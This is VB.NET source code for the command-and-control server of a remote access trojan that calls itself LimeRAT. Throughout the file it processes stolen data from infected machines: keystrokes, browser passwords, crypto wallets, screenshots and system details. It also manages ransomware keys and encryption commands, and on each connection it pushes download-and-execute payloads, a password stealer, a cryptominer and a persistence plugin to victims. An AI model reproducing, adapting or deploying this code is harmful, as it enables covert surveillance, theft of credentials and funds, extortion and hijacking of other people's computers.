Public Class S_Messages


#Region "Client Commands"
    Public Shared M As Main
    Public Shared SPL = S_Settings.SPL
    Private Shared _Gio As New S_GeoIP(Application.StartupPath & "\Misc\GeoIP.dat")
    Delegate Sub _Read(ByVal C As S_Client, ByVal b() As Byte)

    Public Shared Async Sub Read(ByVal C As S_Client, ByVal b() As Byte)

        Dim A As String() = Split(S_Encryption.AES_Decrypt(BS(b)), S_Settings.SPL)

        Try
            Select Case A(0)

#Region "Add to M.L1"

                Case "info"
                    If M.InvokeRequired Then : M.Invoke(New _Read(AddressOf Read), New Object() {C, b}) : Exit Sub : Else
                        For i As Integer = 0 To M.L1.Items.Count - 1
                            If M.L1.Items(i).SubItems(M.ID.Index).Text = A(1) AndAlso M.L1.Items(i).SubItems(M.USERN.Index).Text = A(2) Then
                                M.L1.Items(i).Remove()
                                Exit For
                            End If
                        Next

                        ''''
                        C.L = New ListViewItem()
                        C.L.Text = _Gio.LookupCountryName(C.IP.Split(":")(0))
                        C.L.ImageKey = _Gio.LookupCountryCode(C.IP.Split(":")(0)) & ".png"
                        C.L.Tag = C
                        Try : C.L.ToolTipText = String.Format("Administrator {0}" + Environment.NewLine + "Full Path {1}", A(14), A(15)) : Catch : End Try
                        C.L.SubItems.Add(C.IP.Split(":")(0))
                        For i As Integer = 1 To A.Length - 1
                            If i = 15 Then Exit For
                            C.L.SubItems.Add(A(i))
                        Next

                        Try
                            If GTV(C.L.SubItems(M.ID.Index).Text + "_" + C.L.SubItems(M.USERN.Index).Text + " Color") IsNot Nothing Then
                                C.L.ForeColor = ColorTranslator.FromHtml(GTV(C.L.SubItems(M.ID.Index).Text + "_" + C.L.SubItems(M.USERN.Index).Text + " Color"))
                            End If

                            If GTV(C.L.SubItems(M.ID.Index).Text + "_" + C.L.SubItems(M.USERN.Index).Text + " Note") IsNot Nothing Then
                                C.L.SubItems(M.NOTE_.Index).Text = GTV(C.L.SubItems(M.ID.Index).Text + "_" + C.L.SubItems(M.USERN.Index).Text + " Note")
                            End If
                        Catch ex As Exception
                        End Try

                        SyncLock S_Settings.LVlocker
                            M.L1.Items.Add(C.L)
                            M.L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                            S_Settings.Online.Add(C)
                        End SyncLock

                        If M.MetroToggle1.Checked = True Then
                            M.NotifyIcon1.BalloonTipIcon = ToolTipIcon.None
                            M.NotifyIcon1.BalloonTipText = "User: " + A(2) + vbNewLine + "IP: " + C.IP
                            M.NotifyIcon1.BalloonTipTitle = "LimeRAT | New Connection!"
                            M.NotifyIcon1.ShowBalloonTip(600)
                        End If
                        OnConnect(C)
                    End If
                    Exit Select

#End Region

#Region "Update M.L1"

                Case "!PStart"
                    C.BeginSend("!P")

                Case "!P"
                    If M.InvokeRequired Then
                        M.Invoke(New _Read(AddressOf Read), C, b)
                        Exit Sub
                    End If
                    C.L.SubItems(M.PING.Index).Text = A(1).ToString
                    Exit Select


                Case "!R"
                    If M.InvokeRequired Then
                        M.Invoke(New _Read(AddressOf Read), C, b)
                        Exit Sub
                    End If
                    C.L.SubItems(M.RANS.Index).Text = A(1).ToString
                    M.L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                        Exit Select

                Case "!SP"
                    If M.InvokeRequired Then
                        M.Invoke(New _Read(AddressOf Read), C, b)
                        Exit Sub
                    End If
                    If A(1).ToString.Contains("Spreaded!") Then
                        C.L.BackColor = Color.DarkGreen
                        C.L.SubItems(M.SP.Index).Text = "Just Spreaded!"
                    Else
                        C.L.SubItems(M.SP.Index).Text = A(1).ToString
                    End If
                    M.L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                    Exit Select

                Case "!X"
                    If M.InvokeRequired Then
                        M.Invoke(New _Read(AddressOf Read), C, b)
                        Exit Sub
                    End If
                    C.L.SubItems(M.XMR.Index).Text = A(1).ToString
                    M.L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                    Exit Select

                Case "OK"
                    If M.InvokeRequired Then
                        M.Invoke(New _Read(AddressOf Read), C, b)
                        Exit Sub
                    End If
                    C.L.BackColor = Nothing
                    Exit Select

#End Region

#Region "Remote Desktop"

                        Case "!" ' i recive size of client screen
                    ' lets start Cap form and start capture desktop
                    If M.InvokeRequired Then
                        M.Invoke(New _Read(AddressOf Read), C, b)
                        Exit Sub
                    End If

                    Dim _RDP As Remote_Desktop = My.Application.OpenForms("!" + A(1))

                    If _RDP Is Nothing Then
                        _RDP = New Remote_Desktop
                        _RDP.M = M
                        _RDP.C = C
                        _RDP.Name = "!" + A(1)
                        _RDP.Sz = New Size(A(2), A(3))
                        _RDP.Text = "Remote Desktop - " & C.IP
                        _RDP.BOT = A(1)
                        _RDP.Show()
                    End If
                    Exit Select

                Case "@" ' i recive image  
                    If M.InvokeRequired Then
                        M.Invoke(New _Read(AddressOf Read), C, b)
                        Exit Sub
                    End If
                    Dim _RDP As Remote_Desktop = My.Application.OpenForms("!" + A(1))
                    If _RDP IsNot Nothing Then
                        If A(2).Length = 1 Then
                            If _RDP.MetroButton1.Text = "Stop" Then
                                C.BeginSend("@" & SPL & _RDP.Combo_size.SelectedIndex & SPL & _RDP.C2 & SPL & _RDP.Combo_quality.SelectedItem)
                            End If
                            Exit Sub
                        End If
                        _RDP.PktToImage(System.Text.Encoding.Default.GetBytes(A(2)))
                    End If
                    Exit Select
#End Region

#Region "Password Recovery"

                Case "PWD+"

                    If M.InvokeRequired Then
                        M.Invoke(New _Read(AddressOf Read), C, b)
                        Exit Sub
                    End If

                    Dim Pass As Pass_Recovery = My.Application.OpenForms("PWD")
                    If Pass Is Nothing AndAlso M.PW_F = True Then
                        Pass = New Pass_Recovery
                        Pass.M = M
                        Pass.U = C
                        Pass.Name = "PWD"
                        Pass.Text = " Passwords"
                        Pass.Show()
                    End If

                    'duplicate 
                    Try
                        For Each listItem As ListViewItem In Pass.L1.Items
                            If listItem.SubItems.Item(0).Text.TrimStart.TrimEnd = A(2) Then
                                Exit Select
                            End If
                        Next
                    Catch ex As Exception
                    End Try

                    Try
                        Dim aa As String() = Split(A(1), "~|~")
                        For i = 2 To aa.Length
                            Dim ii As New ListViewItem
                            ii.Text = aa(i)
                            ii.SubItems.Add(aa(i + 2))
                            ii.SubItems.Add(aa(i + 4))
                            ii.SubItems.Add(aa(i + 6))
                            ii.SubItems.Add(aa(i + 8))
                            Pass.L1.Items.Add(ii)
                            i += 9
                        Next
                    Catch ex As Exception
                    End Try

                    IO.File.WriteAllText(uFolder(A(2), "PASS.txt"), A(1))
                    Exit Select
#End Region

#Region "System Manager"

                Case "SysInfo"
                    If M.InvokeRequired Then
                        M.Invoke(New _Read(AddressOf Read), C, b)
                        Exit Sub
                    End If

                    Dim sys As System_Manager = My.Application.OpenForms("Info" + A(20))
                    If sys Is Nothing Then
                        sys = New System_Manager
                        sys.M = M
                        sys.C = C
                        sys.Name = "Info" + A(20)
                        sys.Text = "System Manager " + C.IP
                        sys.Show()
                    End If

                    Dim GW As New ListViewGroup("Windows", HorizontalAlignment.Left)
                    Dim GU As New ListViewGroup("User", HorizontalAlignment.Left)
                    Dim GS As New ListViewGroup("Specifications", HorizontalAlignment.Left)
                    Dim GL As New ListViewGroup("Client", HorizontalAlignment.Left)
                    Dim GM As New ListViewGroup("MISC", HorizontalAlignment.Left)

                    Try
                        With sys.ListView1
                            .Clear()
                            .FullRowSelect = True
                            .View = View.Details
                            .Columns.Add("")
                            .Columns.Add("")
                            .HeaderStyle = ColumnHeaderStyle.None

                            .Groups.Add(GU)
                            .Groups.Add(GW)
                            .Groups.Add(GS)
                            .Groups.Add(GL)
                            .Groups.Add(GM)
                        End With
                    Catch ex As Exception
                    End Try

                    With sys.ListView1.Items
                        .Add(New ListViewItem("Computer Name: ", GU)).SubItems.Add(A(1))

                        .Add(New ListViewItem("User Name: ", GU)).SubItems.Add(A(2))
                        .Add(New ListViewItem("Client ID: ", GU)).SubItems.Add(A(20))


                        .Add(New ListViewItem("Windows Name: ", GW)).SubItems.Add(A(4))
                        .Add(New ListViewItem("Windows Version: ", GW)).SubItems.Add(A(5))
                        .Add(New ListViewItem("Windows Architecture: ", GW)).SubItems.Add(A(6))
                        .Add(New ListViewItem("Product Key: ", GW)).SubItems.Add(A(7))


                        .Add(New ListViewItem("Machine Type: ", GS)).SubItems.Add(A(17))
                        .Add(New ListViewItem("DotNET Framework: ", GS)).SubItems.Add(A(18))
                        .Add(New ListViewItem("CPU Name: ", GS)).SubItems.Add(A(8))
                        .Add(New ListViewItem("GPU Name: ", GS)).SubItems.Add(A(9))
                        .Add(New ListViewItem("RAM: ", GS)).SubItems.Add(A(10))
                        .Add(New ListViewItem("Screen: ", GS)).SubItems.Add(A(11))
                        .Add(New ListViewItem("Fixed Drivers: ", GS)).SubItems.Add(A(19))
                        .Add(New ListViewItem("Removable Drivers: ", GS)).SubItems.Add(A(23))

                        .Add(New ListViewItem("Pastebin URL: ", GL)).SubItems.Add(A(24))
                        .Add(New ListViewItem("HOST: ", GL)).SubItems.Add(A(12))
                        .Add(New ListViewItem("PORT: ", GL)).SubItems.Add(A(13))
                        .Add(New ListViewItem("Privilege: ", GL)).SubItems.Add(A(3))
                        .Add(New ListViewItem("Location: ", GL)).SubItems.Add(A(14))

                        .Add(New ListViewItem("Active Window: ", GM)).SubItems.Add("{ " & A(21) & " }")
                        .Add(New ListViewItem("Last Reboot: ", GM)).SubItems.Add(A(15))
                        .Add(New ListViewItem("Anti-Virus: ", GM)).SubItems.Add(A(16))
                        .Add(New ListViewItem("Firewall: ", GM)).SubItems.Add(A(22))
                    End With

                    sys.ListView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                    Exit Select

                Case "PROC"
                    If M.InvokeRequired Then
                        M.Invoke(New _Read(AddressOf Read), C, b)
                        Exit Sub
                    End If
                    Dim sys As System_Manager = My.Application.OpenForms("Info" + A(3))
                    If sys IsNot Nothing Then

                        Try
                            With sys.L2
                                .Clear()
                                .View = View.Details
                                .Columns.Add("Process name", 250)
                                .Columns.Add("Process M.ID", 80)
                                .Columns.Add("Process path", 250)
                                .GridLines = True
                            End With
                        Catch ex As Exception
                        End Try

                        Try
                            Dim PR As String() = Split(A(1), "|'P'|")
                            For i As Integer = 0 To PR.Length
                                With sys.L2.Items.Add(PR(i))
                                    .SubItems.Add(PR(i + 1))
                                    .SubItems.Add(PR(i + 2))
                                    i += 2
                                End With
                            Next
                        Catch ex1 As Exception
                        End Try

                        Try
                            For Each x As ListViewItem In sys.L2.Items
                                If x.SubItems(2).Text = A(2) Then
                                    x.ForeColor = Color.FromArgb(142, 188, 0)
                                End If
                            Next
                        Catch ex2 As Exception
                        End Try
                    End If

                    sys.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                    Exit Select

                Case "STUP"
                    If M.InvokeRequired Then
                        M.Invoke(New _Read(AddressOf Read), C, b)
                        Exit Sub
                    End If
                    Dim sys As System_Manager = My.Application.OpenForms("Info" + A(9))
                    If sys IsNot Nothing Then
                        Dim G1 As New ListViewGroup("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\", HorizontalAlignment.Left)
                        Dim G2 As New ListViewGroup("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce\", HorizontalAlignment.Left)
                        Dim G3 As New ListViewGroup("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\", HorizontalAlignment.Left)
                        Dim G4 As New ListViewGroup("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\", HorizontalAlignment.Left)
                        Dim G8 As New ListViewGroup("HKEY_LOCAL_MACHINE\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run\", HorizontalAlignment.Left)
                        Dim G6 As New ListViewGroup("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", HorizontalAlignment.Left)
                        Dim G5 As New ListViewGroup("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", HorizontalAlignment.Left)
                        Dim G7 As New ListViewGroup("Startup Folder", HorizontalAlignment.Left)

                        Try
                            With sys.L3
                                .Clear()
                                .View = View.Details
                                .HeaderStyle = ColumnHeaderStyle.None
                                .Columns.Add("")
                                .Columns.Add("")
                                .GridLines = True
                                .Groups.Add(G1)
                                .Groups.Add(G2)
                                .Groups.Add(G3)
                                .Groups.Add(G4)
                                .Groups.Add(G8)
                                .Groups.Add(G6)
                                .Groups.Add(G5)
                                .Groups.Add(G7)
                                .ShowGroups = True
                                .FullRowSelect = True
                            End With
                        Catch ex As Exception
                        End Try

                        Try
                            Dim ST As String() = Split(A(1), "|'P'|")
                            For i As Integer = 0 To ST.Length
                                With sys.L3.Items
                                    .Add(New ListViewItem(ST(i), G1)).SubItems.Add(ST(i + 1))
                                    i += 1
                                End With
                            Next
                        Catch ex As Exception
                        End Try

                        Try
                            Dim ST As String() = Split(A(2), "|'P'|")
                            For i As Integer = 0 To ST.Length
                                With sys.L3.Items
                                    .Add(New ListViewItem(ST(i), G2)).SubItems.Add(ST(i + 1))
                                    i += 1
                                End With
                            Next
                        Catch ex As Exception
                        End Try

                        Try
                            Dim ST As String() = Split(A(3), "|'P'|")
                            For i As Integer = 0 To ST.Length
                                With sys.L3.Items
                                    .Add(New ListViewItem(ST(i), G3)).SubItems.Add(ST(i + 1))
                                    i += 1
                                End With
                            Next
                        Catch ex As Exception
                        End Try

                        Try
                            Dim ST As String() = Split(A(4), "|'P'|")
                            For i As Integer = 0 To ST.Length
                                With sys.L3.Items
                                    .Add(New ListViewItem(ST(i), G4)).SubItems.Add(ST(i + 1))
                                    i += 1
                                End With
                            Next
                        Catch ex As Exception
                        End Try

                        Try
                            Dim ST As String() = Split(A(8), "|'P'|")
                            For i As Integer = 0 To ST.Length
                                With sys.L3.Items
                                    .Add(New ListViewItem(ST(i), G8)).SubItems.Add(ST(i + 1))
                                    i += 1
                                End With
                            Next
                        Catch ex As Exception
                        End Try

                        Try
                            Dim ST As String() = Split(A(6), "|'P'|")
                            For i As Integer = 0 To ST.Length
                                With sys.L3.Items
                                    .Add(New ListViewItem(ST(i), G6)).SubItems.Add(ST(i + 1))
                                    i += 1
                                End With
                            Next
                        Catch ex As Exception
                        End Try

                        Try
                            Dim ST As String() = Split(A(5), "|'P'|")
                            For i As Integer = 0 To ST.Length
                                With sys.L3.Items
                                    .Add(New ListViewItem(ST(i), G5)).SubItems.Add(ST(i + 1))
                                    i += 1
                                End With
                            Next
                        Catch ex As Exception
                        End Try

                        Try
                            Dim ST As String() = Split(A(7), "|'P'|")
                            For i As Integer = 0 To ST.Length
                                With sys.L3.Items
                                    .Add(New ListViewItem(ST(i), G7)).SubItems.Add(ST(i + 1))
                                    i += 1
                                End With
                            Next
                        Catch ex As Exception
                        End Try

                        sys.L3.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                    End If
                    Exit Select

#End Region

#Region "Ransomware"

                Case "Key"
                    If M.InvokeRequired Then
                        M.Invoke(New _Read(AddressOf Read), C, b)
                        Exit Sub
                    End If

                    IO.File.WriteAllText(uFolder(A(1), "KEY.txt"), A(2))
                    Exit Select

                Case "SC"
                    If M.InvokeRequired Then
                        M.Invoke(New _Read(AddressOf Read), C, b)
                        Exit Sub
                    End If

                    IO.File.WriteAllBytes(uFolder(A(1), "SC.jpeg"), Convert.FromBase64String(A(2)))
                    Exit Select

                Case "DEC"
                    If M.InvokeRequired Then
                        M.Invoke(New _Read(AddressOf Read), C, b)
                        Exit Sub
                    End If

                    C.BeginSend("DEC" + SPL + IO.File.ReadAllText(uFolder(A(1), "KEY.txt")))
                    Exit Select

                Case "ENC"
                    If M.InvokeRequired Then
                        M.Invoke(New _Read(AddressOf Read), C, b)
                        Exit Sub
                    End If

                    C.BeginSend("ENC" + SPL + M.RANS_TEXT + SPL + M.RANS_IMG)
                    Exit Select
#End Region

#Region "File Manager"
                Case "OFM"
                    If M.InvokeRequired Then
                        M.Invoke(New _Read(AddressOf Read), C, b)
                        Exit Sub
                    End If

                    Dim FM As File_Manager = My.Application.OpenForms("FM" + A(1))
                    If FM Is Nothing Then
                        FM = New File_Manager
                        FM.M = M
                        FM.C = C
                        FM.Name = "FM" + A(1)
                        FM.Text = "File Manager " + C.IP
                        FM.Show()
                    End If
                    Exit Select

                Case "FM"
                    If M.InvokeRequired Then
                        M.Invoke(New _Read(AddressOf Read), C, b)
                        Exit Sub
                    End If

                    Dim FM As File_Manager = My.Application.OpenForms("FM" & A(1))
                    If FM IsNot Nothing Then


                        If A(2) = "Error " Then
                            FM.BackToolStripMenuItem.PerformClick()
                            FM.Label2.Text = A(3)
                            Return
                        Else
                            FM.L1.Items.Clear()
                            Dim allFiles As String() = Split(A(2), "|SPL_FM|")
                            For i = 0 To allFiles.Length - 2
                                Dim itm As New ListViewItem
                                itm.Text = allFiles(i)
                                itm.SubItems.Add(allFiles(i + 1))
                                If Not itm.Text.StartsWith("[Drive]") And Not itm.Text.StartsWith("[CD]") And Not itm.Text.StartsWith("[Folder]") Then
                                    itm.SubItems(1).Text = siz(itm.SubItems(1).Text)
                                    itm.Tag = Convert.ToInt64(allFiles(i + 1))
                                End If
                                If itm.Text.StartsWith("[Drive]") Then
                                    itm.ImageIndex = 0
                                    itm.Text = itm.Text.Substring(7)
                                ElseIf itm.Text.StartsWith("[CD]") Then
                                    itm.ImageIndex = 1
                                    itm.Text = itm.Text.Substring(4)
                                ElseIf itm.Text.StartsWith("[Folder]") Then
                                    itm.ImageIndex = 2
                                    itm.Text = itm.Text.Substring(8)
                                ElseIf itm.Text.EndsWith(".exe") Then
                                    itm.ImageIndex = 3
                                ElseIf itm.Text.EndsWith(".jpg") OrElse itm.Text.EndsWith(".jpeg") OrElse itm.Text.EndsWith(".gif") OrElse itm.Text.EndsWith(".png") OrElse itm.Text.EndsWith(".bmp") Then
                                    itm.ImageIndex = 4
                                ElseIf itm.Text.EndsWith(".doc") OrElse itm.Text.EndsWith(".rtf") OrElse itm.Text.EndsWith(".txt") Then
                                    itm.ImageIndex = 5
                                ElseIf itm.Text.EndsWith(".dll") Then
                                    itm.ImageIndex = 6
                                ElseIf itm.Text.EndsWith(".zip") OrElse itm.Text.EndsWith(".rar") Then
                                    itm.ImageIndex = 7
                                ElseIf itm.Text.EndsWith(".wav") Then
                                    itm.ImageIndex = 9
                                ElseIf itm.Text.EndsWith(".avi") OrElse itm.Text.EndsWith(".mb4") OrElse itm.Text.EndsWith(".flv") OrElse itm.Text.EndsWith(".3gp") Then
                                    itm.ImageIndex = 11
                                ElseIf itm.Text.EndsWith(".mp3") Then
                                    itm.ImageIndex = 12
                                ElseIf itm.Text.EndsWith(".html") OrElse itm.Text.EndsWith(".Php") OrElse itm.Text.EndsWith(".xml") Then
                                    itm.ImageIndex = 10
                                ElseIf itm.Text.EndsWith(".rar") Then
                                    itm.ImageIndex = 13
                                ElseIf itm.Text.EndsWith(".Lime") Then
                                    itm.ForeColor = Color.Lime
                                    itm.ImageIndex = 14
                                Else
                                    itm.ImageIndex = 8
                                End If
                                FM.L1.Items.Add(itm)
                                i += 1
                            Next
                            Try
                                If A(3).ToString.Length > 3 Then
                                    FM.Label1.Text = A(3) + "\"
                                End If
                            Catch ex As Exception
                            End Try
                            FM.L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                        End If
                    End If
                    Exit Select

                Case "DW"
                    If M.InvokeRequired Then
                        M.Invoke(New _Read(AddressOf Read), C, b)
                        Exit Sub
                    End If

                    Dim FM As File_Manager = My.Application.OpenForms("FM" & A(1))
                    If FM IsNot Nothing Then
                        IO.File.WriteAllBytes(uFolder(A(1) + "\Downloads", A(3)), Convert.FromBase64String(A(2)))
                        FM.Label2.Text = "Download Finish " + A(3)
                    End If
                    Exit Select

                Case "UP"
                    If M.InvokeRequired Then
                        M.Invoke(New _Read(AddressOf Read), C, b)
                        Exit Sub
                    End If

                    Dim FM As File_Manager = My.Application.OpenForms("FM" & A(1))
                    If FM IsNot Nothing Then
                        FM.RefreshList()
                        FM.Label2.Text = "Upload Finish " + A(2)
                    End If
                    Exit Select

                Case "DEL"
                    If M.InvokeRequired Then
                        M.Invoke(New _Read(AddressOf Read), C, b)
                        Exit Sub
                    End If

                    Dim FM As File_Manager = My.Application.OpenForms("FM" & A(1))
                    If FM IsNot Nothing Then
                        FM.RefreshList()
                    End If
                    Exit Select

                Case "PRE"
                    If M.InvokeRequired Then
                        M.Invoke(New _Read(AddressOf Read), C, b)
                        Exit Sub
                    End If

                    Dim FM As File_Manager = My.Application.OpenForms("FM" & A(1))
                    If FM IsNot Nothing Then
                        Dim MM = New IO.MemoryStream(Text.Encoding.Default.GetBytes(A(2)))
                        FM.PictureBox1.Image = Bitmap.FromStream(MM)
                        FM.Label2.ForeColor = Color.Lime
                        FM.Label2.Text = "Preview Size " & siz(A(2).Length)
                        FM.PictureBox1.Visible = True
                        MM.Dispose()
                    End If
                    Exit Select


#End Region

#Region "Keylogger"

                Case "KL"
                    If M.InvokeRequired Then
                        M.Invoke(New _Read(AddressOf Read), C, b)
                        Exit Sub
                    End If

                    Dim KL As Keylogger = My.Application.OpenForms("KL" + A(1))

                    If KL Is Nothing Then
                        KL = New Keylogger
                        KL.M = M
                        KL.C = C
                        KL.Name = "KL" + A(1)
                        KL.Text = "Keylogger - " & C.IP
                        KL.Show()
                    End If

                    KL.RichTextBox1.AppendText(A(2).ToString)
                    Exit Select

#End Region

#Region "Crypto"

                Case "CRYP"
                    If M.InvokeRequired Then
                        M.Invoke(New _Read(AddressOf Read), C, b)
                        Exit Sub
                    End If

                    IO.File.WriteAllBytes(uFolder(A(1), "Wallets.zip"), Convert.FromBase64String(A(2)))
                    Messages(C.IP, "Found Wallets: " + A(3))
#End Region

#Region "Enable Windows RDP"

                Case "WRDP"
                    If M.InvokeRequired Then
                        M.Invoke(New _Read(AddressOf Read), C, b)
                        Exit Sub
                    End If
                    Messages(C.IP, "Enable Remote Desktop! USER:Lime PASS:123")
                    Process.Start("mstsc", "/v:" + C.IP)

#End Region

#Region "Thumbnail"

                Case "#CAP"
                    If M.InvokeRequired Then
                        M.Invoke(New _Read(AddressOf Read), C, b)
                        Exit Sub
                    End If

                    Dim MM = New IO.MemoryStream(System.Text.Encoding.Default.GetBytes(A(2)))
                    Bitmap.FromStream(MM)
                    For Each x As ListViewItem In M.L3.Items
                        If x.SubItems(0).Text = A(1) Then
                            Dim imgKey As String = A(1)
                            Dim previousImage As Image = M.ImageList1.Images(M.ImageList1.Images.Keys.IndexOf(A(1)))
                            M.ImageList1.Images.RemoveByKey(imgKey)
                            M.ImageList1.Images.Add(imgKey, Bitmap.FromStream(MM))
                            previousImage.Dispose()
                            MM.Dispose()
                            Exit Select
                        End If
                    Next

                    M.ImageList1.Images.Add(A(1), Bitmap.FromStream(MM))
                    M.L3.Items.Add(A(1), A(1))
                    MM.Dispose()
                    Exit Select
#End Region

#Region "Send Plugin"
                Case "GPL"
                    If M.InvokeRequired Then
                        M.Invoke(New _Read(AddressOf Read), C, b)
                        Exit Sub
                    End If

                    Dim Folderx = IO.Directory.GetFiles(Application.StartupPath & "\Misc\Plugins")
                    For Each file In Folderx
                        Dim HASH = getMD5Hash(IO.File.ReadAllBytes(file))

                        If HASH = A(1) Then
                            C.BeginSend("IPL" + SPL + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(file), True)) + SPL + getMD5Hash(IO.File.ReadAllBytes(file)))
                            Exit Select
                        End If
                    Next

                Case "PLUSB"
                    If M.InvokeRequired Then
                        M.Invoke(New _Read(AddressOf Read), C, b)
                        Exit Sub
                    End If

                    C.BeginSend("IPL" + SPL + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\USB.dll"), True)) + SPL + "_USB")
                    Exit Select

                Case "PLPIN"
                    If M.InvokeRequired Then
                        M.Invoke(New _Read(AddressOf Read), C, b)
                        Exit Sub
                    End If

                    C.BeginSend("IPL" + SPL + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PIN.dll"), True)) + SPL + "_PIN")
                    Exit Select

                Case "PLKLG"
                    If M.InvokeRequired Then
                        M.Invoke(New _Read(AddressOf Read), C, b)
                        Exit Sub
                    End If

                    C.BeginSend("IPL" + SPL + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\KLG.dll"), True)) + SPL + "_KLG")
                    Exit Select

#End Region

#Region "Messages"
                Case "MSG"
                    If M.InvokeRequired Then
                        M.Invoke(New _Read(AddressOf Read), C, b)
                        Exit Sub
                    End If

                    Messages(C.IP, A(1))
                    Exit Select
#End Region

            End Select
        Catch ex As Exception
            Messages(C.IP, ex.Message)
        End Try
    End Sub

#End Region


#Region "Logs"

    Delegate Sub _Messages(ByVal user As String, ByVal msg As String)
    Public Shared Sub Messages(ByVal user As String, ByVal msg As String)
        If M.InvokeRequired Then : M.Invoke(New _Messages(AddressOf Messages), New Object() {user, msg}) : Exit Sub : Else
            M.L2.Items.Insert(0, "[" + DateAndTime.Now.ToString("hh:mm:ss tt") + "]" + "  " + user + "  →  " + msg.ToString)
            If msg.ToString.Contains("Error!") AndAlso M.MetroToggle1.Checked = True Then
                Try : My.Computer.Audio.Play(My.Resources._Error, AudioPlayMode.Background) : Catch : End Try 'https://freesound.org/people/eardeer/sounds/385281/
            End If
        End If
    End Sub



#End Region


    Private Shared Async Sub OnConnect(ByVal C As S_Client)
        Try

            Messages("{" + C.IP + "}", "Connected")

            If M.CHK_DE AndAlso IO.File.Exists(M.PathEXE) AndAlso Not M.List_DE.Contains(C.L.SubItems(M.ID.Index).Text) Then

                Dim PLG = Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\MISC.dll"), True))
                Dim F = Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(M.PathEXE), True))
                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + PLG + SPL + "RD-|'P'|" + IO.Path.GetFileName(M.PathEXE) + "|'P'|" + F))
                Dim MS As New IO.MemoryStream
                Await MS.WriteAsync(CMD, 0, CMD.Length)
                Await MS.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)

                C.Send(MS.ToArray)
                Await MS.FlushAsync

                MS.Dispose()
                M.List_DE.Add(C.L.SubItems(M.ID.Index).Text)
                Messages(C.L.SubItems(M.ID.Index).Text, "On Connect: Download and Execute " + IO.Path.GetFileName(M.PathEXE))
            End If

            If M.CHK_PWD = True AndAlso Not M.List_PWD.Contains(C.L.SubItems(M.ID.Index).Text) Then
                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PWD.dll"))))
                Dim MS As New IO.MemoryStream
                Await MS.WriteAsync(CMD, 0, CMD.Length)
                Await MS.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)

                C.Send(MS.ToArray)
                Await MS.FlushAsync

                M.List_PWD.Add(C.L.SubItems(M.ID.Index).Text)
                Messages((C.L.SubItems(M.ID.Index).Text), "On Connect: PWD")
            End If

            If M.CHK_MINER = True AndAlso Not M.List_MINER.Contains(C.L.SubItems(M.ID.Index).Text) Then
                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt(M._MINER_SETTINGS))
                Dim MS As New IO.MemoryStream
                Await MS.WriteAsync(CMD, 0, CMD.Length)
                Await MS.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)

                C.Send(MS.ToArray)
                Await MS.FlushAsync

                M.List_MINER.Add(C.L.SubItems(M.ID.Index).Text)
                Messages(C.L.SubItems(M.ID.Index).Text, "On Connect: MINER")
            End If

            If M.CHK_PERS = True AndAlso Not M.List_PERS.Contains(C.L.SubItems(M.ID.Index).Text) Then
                Dim CMD As Byte() = SB(S_Encryption.AES_Encrypt("IPLM" + SPL + Convert.ToBase64String(Await GZip(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PERS.dll"), True)) + SPL + " "))
                Dim MS As New IO.MemoryStream
                Await MS.WriteAsync(CMD, 0, CMD.Length)
                Await MS.WriteAsync(SB(S_Settings.EOF), 0, S_Settings.EOF.Length)

                C.Send(MS.ToArray)
                Await MS.FlushAsync

                M.List_PERS.Add(C.L.SubItems(M.ID.Index).Text)
                Messages((C.L.SubItems(M.ID.Index).Text), "On Connect: Persistence")
            End If

        Catch ex As Exception
            Messages(C.IP, ex.Message)
        End Try
    End Sub


End Class
